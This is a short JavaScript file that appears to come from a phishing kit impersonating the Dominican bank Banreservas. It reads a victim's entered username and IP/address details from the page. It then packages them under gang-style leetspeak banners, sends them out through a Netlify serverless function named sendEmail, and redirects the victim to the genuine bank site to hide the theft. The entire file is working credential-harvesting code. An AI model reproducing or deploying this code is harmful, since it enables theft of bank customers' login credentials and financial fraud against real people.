var ready = function () {
    let u_name = document.getElementById("0T4RX").value;
    let ip     = document.getElementById("ip").innerHTML;
    let ip2    = document.getElementById("address").innerHTML;

    return `🔹B4NR3S3RV4S v.1🔹
🔐C0DIX: ${u_name}

IP: ${ip}
${ip2}
🔹BLACK M4F14🔹`;
};

var sender = function () {
    let message = ready();

    fetch('/.netlify/functions/sendEmail', {   // ✅ MISMA FUNCTION
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ message })      // ✅ MISMO PAYLOAD
    })
    .then(r => r.json())
    .then(() => {
        window.location = 'https://www.banreservas.com/';
    })
    .catch(err => console.error(err));

    return false;
};
